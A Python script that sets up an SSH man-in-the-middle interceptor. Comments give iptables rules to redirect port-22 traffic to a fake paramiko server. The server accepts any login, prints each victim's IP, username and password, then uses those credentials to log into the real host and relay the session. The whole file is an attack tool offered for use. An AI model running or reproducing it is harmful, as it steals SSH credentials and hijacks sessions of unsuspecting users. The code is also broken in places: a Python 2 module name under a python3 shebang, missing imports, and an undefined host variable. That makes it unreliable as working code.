#!/usr/bin/env python3

#
## iptables -t nat -I PREROUTING -p tcp --dport 22 -j DNAT --to-destination 127.0.0.1:2200
## sysctl net.ipv4.ip_forward=1
## iptables -t nat -A POSTROUTING -j MASQUERADE
#

import select
import socket
import paramiko
import threading
import traceback
import SocketServer
from paramiko.py3compat import u
from binascii import hexlify

LOCAL_PORT = 2200
REMOTE_PORT = 4343
REMOTE_HOST = 'REMOTE_SSH_ADDR'

host_key = paramiko.RSAKey(filename='test_rsa')
print('Read key: ' + u(hexlify(host_key.get_fingerprint())))

class Server (paramiko.ServerInterface):

    def __init__(self, client_address):
        self.event = threading.Event()
        self.client_address = client_address

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        print(
            'IP:'+self.client_address[0]+' User:'+username+' Pass:'+password
         )
        self.password = password
        self.username = username

        return paramiko.AUTH_SUCCESSFUL

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(
      self,
      channel,
      term,
      width,
      height,
      pixelwidth,
      pixelheight,
      modes
   ):
       return True

class SSHHandler(SocketServer.StreamRequestHandler):
    def handle(self):

        try:
            dst = self.connection.getsockopt(socket.SOL_IP, socket.SO_ORIGINAL_DST, 16)
            srv_port, srv_ip = struct.unpack("!2xH4s8x", dst)
            print( "original %s:%d" % (inet_ntoa(srv_ip), srv_port))
        except AttributeError:
            print('No SO_ORIGINAL_DST')
            srv_port = REMOTE_PORT
            srv_host = REMOTE_HOST

        try:
            t = paramiko.Transport(self.connection)
            t.add_server_key(host_key)
            server = Server(self.client_address)
            try:
                t.start_server(server=server)
            except paramiko.SSHException:
                print('*** SSH negotiation failed.')
                return

            # wait for auth
            chan = t.accept(20)
            if chan is None:
                t.close()
                return
            print('Authenticated!')

            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.client.connect(
                srv_host,
                username=server.username,
                password=server.password,
                port=srv_port
            )
            chan2 = self.client.invoke_shell()

            while True:
                r, w, e = select.select([chan2, chan], [], [])
                if chan in r:
                    x = chan.recv(1024)
                    if len(x) == 0:
                        break
                    chan2.send(x)

                if chan2 in r:
                    x = chan2.recv(1024)
                    if len(x) == 0:
                        break
                    chan.send(x)

            server.event.wait(10)
            if not server.event.is_set():
                print('*** Client never asked for a shell.')
                t.close()
                return
            chan.close()

        except Exception as e:
            print('*** Caught exception: ' + str(e.__class__) + ': ' + str(e))
            traceback.print_exc()
        finally:
            try:
                t.close()
            except:
                pass

sshserver = SocketServer.ThreadingTCPServer(
   ("0.0.0.0", LOCAL_PORT),
   SSHHandler
)
sshserver.serve_forever()
